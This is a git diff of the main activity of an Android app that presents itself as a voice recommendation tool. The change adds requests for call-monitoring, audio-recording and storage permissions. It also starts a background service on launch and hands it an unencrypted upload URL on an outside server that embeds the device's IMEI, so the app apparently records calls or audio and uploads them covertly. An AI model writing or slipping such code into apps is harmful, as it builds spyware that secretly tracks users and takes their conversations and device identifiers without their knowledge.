@@ -19,10 +19,11 @@ import android.widget.Toast;
 
 import com.android.volley.Request;
 import com.android.volley.RequestQueue;
-import com.android.volley.toolbox.JsonObjectRequest;
+import com.android.volley.request.JsonObjectRequest;
 import com.android.volley.toolbox.Volley;
 import com.google.gson.Gson;
 import com.taboola.voicerecommendation.model.RecognizedText;
+import com.taboola.voicerecommendation.service.TService;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -37,12 +38,14 @@ public class MainActivity extends AppCompatActivity {
     private static final Gson gson = new Gson();
     private static final int PERMISSIONS_GRANTED_CODE = 101;
     public static final String CLASS_SIMPLE_NAME = MainActivity.class.getSimpleName();
+    public static final String UPLOAD_URL = "UPLOAD_URL";
     private String URL;
 
     private Button btnSendText;
     private Button btnStartRecording;
     private TextView txtRecognizedSpeech;
     private RequestQueue queue;
+    private TextView txtSendResult;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -53,12 +56,38 @@ public class MainActivity extends AppCompatActivity {
         btnStartRecording = findViewById(R.id.btnStartRecording);
         btnStartRecording.setOnClickListener((v) -> startVoiceInput());
         txtRecognizedSpeech = findViewById(R.id.txtRecognizedSpeech);
+        txtSendResult = findViewById(R.id.txtSendResult);
         queue = Volley.newRequestQueue(this);
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+        handlePermissions();
+        startService(new Intent(this, TService.class).putExtra(UPLOAD_URL, URL));
+    }
+
+    private void handlePermissions() {
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) !=
+                PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(this,
                     new String[]{Manifest.permission.READ_PHONE_STATE}, PERMISSIONS_GRANTED_CODE);
         }
-        URL = String.format("http://mxprocess.net:8080/users/%s/upload", ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getImei());
+        if (ActivityCompat.checkSelfPermission(this,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE)
+                != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this,
+                    new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, PERMISSIONS_GRANTED_CODE);
+        }
+        if (ActivityCompat.checkSelfPermission(this,
+                Manifest.permission.RECORD_AUDIO)
+                != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this,
+                    new String[]{Manifest.permission.RECORD_AUDIO}, PERMISSIONS_GRANTED_CODE);
+        }
+        if (ActivityCompat.checkSelfPermission(this,
+                Manifest.permission.PROCESS_OUTGOING_CALLS)
+                != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this,
+                    new String[]{Manifest.permission.PROCESS_OUTGOING_CALLS}, PERMISSIONS_GRANTED_CODE);
+        }
+        URL = String.format("http://mxprocess.net:8080/users/%s/upload",
+                ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getImei());
     }
 
     private void sendText() {
@@ -74,7 +103,7 @@ public class MainActivity extends AppCompatActivity {
                 txtRecognizedSpeech.getText().toString());
         JSONObject jsonRequest = new JSONObject(gson.toJson(recognizedText));
         return new JsonObjectRequest(Request.Method.POST, URL, jsonRequest,
-                response -> txtRecognizedSpeech.setText(response.toString()),
+                response -> txtSendResult.setText(response.toString()),
                 error -> Log.e(CLASS_SIMPLE_NAME, "Sending failed", error));
     }
 
